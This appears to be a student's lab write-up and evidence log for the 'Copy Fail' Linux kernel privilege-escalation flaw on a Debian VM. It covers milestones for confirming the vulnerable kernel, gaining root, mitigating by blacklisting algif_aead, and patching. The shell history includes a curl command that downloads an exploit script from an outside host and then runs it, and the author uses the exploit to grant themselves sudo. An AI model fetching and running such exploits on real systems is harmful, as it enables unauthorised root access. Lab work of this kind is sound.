# Directorio de Evidencias

Aquí van los archivos que documentan tu progreso en cada hito.

## Archivos esperados

| Archivo | Hito | Descripción |
|---------|------|-------------|
| `hito1_vuln_confirmed.txt` | Hito 1 | Kernel corriendo, módulo algif_aead confirmado |
| `hito2_root_shell.txt` | Hito 2 | Salida del exploit con `uid=0(root)` |
| `hito3_mitigation.txt` | Hito 3 | Módulo removido, exploit fallando |
| `hito4_patched.txt` | Hito 4 | Exploit fallando en kernel parcheado |

## Reglas

1. **No copies** archivos de otro estudiante. El autocalificador verifica que el
   hostname de la VM (copy-fail-TUNOMBRE) sea consistente en todos los archivos.

2. **Cada archivo debe tener timestamp** del momento en que lo generaste.

3. **El hostname** en los archivos debe coincidir con tu STUDENT_ID.

## Cómo generar evidencias

Ver `CHALLENGE.md` para comandos exactos de cada hito.

Ejemplo rápido:
```sh
# Dentro de la VM QEMU, ejecuta el comando de evidencia del hito
# Luego copia el texto y guárdalo aquí
```


THIS EVALUATION HAS BEEN DONE ON A DEBIAN 13 VIRTUAL MACHINE (DEBIAN TRIXIE)

HITO 1:Vulnerable Linux Kernel (tested on Debian)
![alt text](imagen.png)
In here, we check for the kernel version using uname -a, and we can see the kernel 6.12.74, which is inside the critical range of the affected systems, because this specific kernel has the original logical fail in the cryptographic subsystem,  according to Team (2026). This is more than enough to verify the kernel is vulnerable.

HITO 2: Successful exploit using the .py archive containing malicious code.
![alt text](imagen-1.png)
![alt text](imagen-2.png)
In here, we can see the successful exploit, as we used curl to copy the information containing the archive directly from the internet (this is possible as the debian VM is connected to the internet). We first check we have our own id and executing whoami shows us the name (in this case PaulaCevallos). But when we execute the exploit, we can see that we have become root.

HITO 3: Temporal mitigation

note: To guarantee effective mitigation in a production-ready environment prior to applying a permanent source-code patch (Milestone 4), running rmmod alone is insufficient. It is mandatory to enforce a module blacklist rule within /etc/modprobe.d/ to legally forbid the kernel from autoloading the driver, combined with flushing the corrupted memory using the /proc/sys/vm/drop_caches directive.

Ironically, before we put in the commands, we need sudo access given to the specific user, in my case PaulaCevallos, so I'll use the exploit (that we have not yet patched up lol) to give myself sudo access, then, I'll reestart the VM:
![alt text](imagen-4.png)
![alt text](imagen-3.png)
as we can see, we executed the following commands:
echo "install algif_aead /bin/false" | sudo tee /atc/modprobe.d/disable-algif.conf
sudo rmmod algif_aead 2>/dev/null || true
grep -qE 'algif_aead ' /proc/modules && echo "Affected module is loaded" || echo "Affected module is NOT loaded"

The first command disables the algif_aead module from being automatically reloaded by the system kernel. It uses echo to output a specific string configuration rule, which states that any attempt to install or load this specific module should run /bin/false (a command that does nothing and immediately fails) instead. This output string is redirected via a pipe (|) into the tee command, which runs with administrative root privileges via sudo. The tee utility writes this configuration string directly into a new configuration file located at the absolute path /etc/modprobe.d/disable-algif.conf, ensuring the kernel enforces this loading restriction.

The second command immediately forces the active kernel to drop and unload the target module from the running system memory. It runs the rmmod (Remove Module) utility elevated with root privileges via sudo and passes algif_aead as the specific argument to target. To keep the script execution clean, standard error output (stderr) is redirected using 2> to the null device (/dev/null), which permanently discards any annoying error messages if the module was already absent. Finally, the conditional OR operator (||) hooks into the true utility, ensuring that even if the removal command fails, the entire shell line evaluates as a successful execution so automation scripts do not halt.

The third command acts as a validation script to dynamically check whether the module remains active in the system runtime environment. It employs the grep utility with the quiet flag -q to suppress screen output and the extended regular expression flag -E to search for the specific pattern 'algif_aead ' inside the virtual file /proc/modules, which tracks all active kernel components. If grep finds a match, the logical AND operator (&&) triggers an echo command that prints "Affected module is loaded". If no match is found, the logical OR operator (||) acts as an else clause, executing an alternative echo command that prints "Affected module is NOT loaded" to confirm successful mitigation.

HITO 4: Permanent fix
![alt text](imagen-5.png)
In this case, since I am working in a Virtual Machine (Debian VM), the reboot of the system, but before that, we have to put in these two commands:
sudo apt update && sudo apt upgrade -y
sudo reboot
The first command completely updates the virtual machine's software packages. It starts with `sudo apt update` to download the latest package lists from the repositories so the system knows what updates are available. The `&&` operator ensures that if the update succeeds, the shell immediately runs `sudo apt upgrade -y`, which downloads and installs the actual software and security updates, using the `-y` flag to automatically answer "yes" to all installation prompts.

The second command, `sudo reboot`, immediately restarts the virtual machine with administrative privileges. This forces the system to gracefully close all running services and reboot the operating system, which is required to apply the newly installed software dependencies and load the updated Linux kernel cleanly into memory.

Then, after all is done, we will check our kernel version to verify the changes:
![alt text](imagen-6.png)
    here, we can see that the new kernel is in the version 6.12.88 (non-vulnerable), as opposed to the initial kernel version of 6.12.74 (vulnerable).


References:
Team, M. D. S. R. (2026, 2 mayo). CVE-2026-31431: Copy Fail vulnerability enables Linux root privilege escalation across cloud environments. Microsoft Security Blog. https://www.microsoft.com/en-us/security/blog/2026/05/01/cve-2026-31431-copy-fail-vulnerability-enables-linux-root-privilege-escalation/

History of commands made:
1  uname -a
    2  curl https://copy.fail/exp > copy_fail_exp.py
    3  cim copy_fail_exp.py
    4  clear
    5  uname -a
    6  curl https://copy.fail/exp > copy_fail_exp.py
    7  vim copy_fail_exp.py
    8  id
    9  whoami
   10  python3 copy_fail_exp.py
   11  whoami
   12  id
   13  echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/disable-algif.conf
   14  su -
   15  echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/disable-algif.conf
   16  visudo
   17  su -
   18  sudo -l -U PaulaCevallos
   19  python3 copy_fail_exp.py
   20  ls mod | grep algif_eaead
   21  clear
   22  lsmod | grep algif_aead
   23  rmmod algif_aead
   24  sudo rmmod algif_aead
   25  python3 copy_fail_exp.py
   26  su -
   27  lsmod | grep algif_aead
   28  sudo rmmod algif_aead
   29  lsmod | grep algif_aead
   30  python3 copy_fail_exp.py
   31  clear
   32  echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/disable-algif.conf
   33  sudo rmmod algif_aead 2>/dev/null || true
   34  grep -qE 'algif_aead ' /proc/modules && echo "Affected module is loaded" || echo "Affected module is NOT loaded"
   35  python3 copy_fail_exp.py
   36  cd kernel/linux/crypto
   37  less algif_aead.c
   38  sudo apt update && sudo apt upgrade -y
   39  sudo reboot
   40  uname -r
   41  python3 coy_fail_exp.py
   42  python3 copy_fail_exp.py
   43  lsmod | grep algif_aead
   44  echo "Ya està parchado de manera permanente"
   45  history
